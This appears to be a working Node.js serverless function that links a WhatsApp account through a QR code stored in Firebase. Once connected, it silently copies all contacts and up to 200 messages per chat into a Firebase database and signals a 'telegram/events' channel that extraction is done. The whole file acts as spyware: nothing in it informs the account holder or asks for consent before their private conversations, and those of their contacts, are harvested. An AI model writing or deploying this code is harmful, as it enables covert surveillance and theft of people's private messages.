const { Client, LocalAuth } = require('whatsapp-web.js');
const QRCode = require('qrcode');
const admin = require('firebase-admin');

if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert({
            projectId: process.env.FIREBASE_PROJECT_ID,
            clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
            privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
        }),
        databaseURL: process.env.FIREBASE_DB_URL
    });
}
const db = admin.database();
const sessions = {};

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { uid, phone } = req.body;

    try {
        const sessionExists = await db.ref(`whatsapp_sessions/${uid}`).once('value');
        if (sessionExists.val()) {
            return res.json({ success: true, message: 'Session already exists', sessionId: uid });
        }

        const client = new Client({
            authStrategy: new LocalAuth({ clientId: `wa_${uid}` }),
            puppeteer: { headless: true, args: ['--no-sandbox'] }
        });

        sessions[uid] = client;

        client.on('qr', async (qr) => {
            const qrBuffer = await QRCode.toDataURL(qr);
            await db.ref(`whatsapp_qr/${uid}`).set({
                qr: qr,
                qrImage: qrBuffer,
                phone: phone,
                timestamp: new Date().toISOString()
            });
        });

        client.on('ready', async () => {
            console.log(`✅ Connected: ${uid}`);
            await db.ref(`whatsapp_sessions/${uid}`).set({
                uid, phone, connected: true, connectedAt: new Date().toISOString()
            });
            await db.ref(`whatsapp_qr/${uid}`).remove();
            await extractData(client, uid, phone);
        });

        client.on('disconnected', async (reason) => {
            await db.ref(`whatsapp_sessions/${uid}`).update({ connected: false, reason });
            delete sessions[uid];
        });

        client.initialize();

        res.json({ success: true, message: 'WhatsApp session initializing...', uid });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};

async function extractData(client, uid, phone) {
    try {
        const contacts = await client.getContacts();
        const chats = await client.getChats();
        const dataRef = db.ref(`whatsapp_data/${uid}`);

        for (const c of contacts) {
            await dataRef.child('contacts').push({
                name: c.name || 'Unknown',
                number: c.number,
                pushname: c.pushname || ''
            });
        }

        for (const chat of chats) {
            const msgs = await chat.fetchMessages({ limit: 200 });
            await dataRef.child('chats').child(chat.id._serialized).set({
                chatName: chat.name || 'Unknown',
                messageCount: msgs.length,
                timestamp: new Date().toISOString()
            });
            for (const m of msgs) {
                await dataRef.child('messages').push({
                    from: m.from, to: m.to,
                    body: m.body || 'Media',
                    type: m.type,
                    timestamp: m.timestamp
                });
            }
        }

        await db.ref('telegram/events').push({
            event: 'whatsapp_data_extracted',
            data: { uid, phone, contacts: contacts.length, chats: chats.length },
            timestamp: new Date().toISOString()
        });

        console.log(`✅ Data extracted for: ${uid}`);
    } catch (error) {
        console.error('Extract error:', error);
    }
      }
